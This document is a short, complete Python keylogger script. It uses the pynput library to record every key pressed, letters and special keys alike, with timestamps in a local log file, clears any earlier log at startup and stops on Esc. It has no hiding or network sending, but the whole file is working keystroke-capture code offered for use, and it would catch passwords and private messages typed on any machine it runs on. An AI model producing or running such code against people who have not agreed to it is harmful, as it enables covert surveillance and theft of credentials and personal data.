from pynput import keyboard
import logging
import os
import argparse

def setup_logging(log_file, log_level):
    logging.basicConfig(filename=log_file, level=log_level, format="%(asctime)s: %(message)s")

def on_press(key):
    try:
        logging.info(f"Pressed: {key.char}")
    except AttributeError:
        # Handle special keys
        special_keys = {
            keyboard.Key.enter: "Enter",
            keyboard.Key.space: "Space",
            keyboard.Key.tab: "Tab",
            keyboard.Key.backspace: "Backspace",
            keyboard.Key.shift: "Shift",
            keyboard.Key.ctrl: "Ctrl",
            keyboard.Key.alt: "Alt",
            keyboard.Key.esc: "Esc"
        }
        logging.info(f"Pressed: {special_keys.get(key, key)}")

def on_release(key):
    if key == keyboard.Key.esc:
        logging.info("Exiting the keylogger...")
        return False

def main(log_file, log_level):
    setup_logging(log_file, log_level)
    logging.info("Keylogger started")
    
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    logging.info("Keylogger stopped")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="A simple keylogger.", add_help=False)
    parser.add_argument('--logfile', type=str, default='keylogging.txt', help='Log file name')
    parser.add_argument('--loglevel', type=str, default='INFO', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL'],
                        help='Set the logging level')

    # Optionally add help argument
    parser.add_argument('--help', action='help', help='Show this help message and exit')

    args = parser.parse_args()

    # Convert string log level to logging level
    log_level = getattr(logging, args.loglevel.upper())

    # Clear the log file at the beginning
    if os.path.exists(args.logfile):
        os.remove(args.logfile)

    main(args.logfile, log_level)
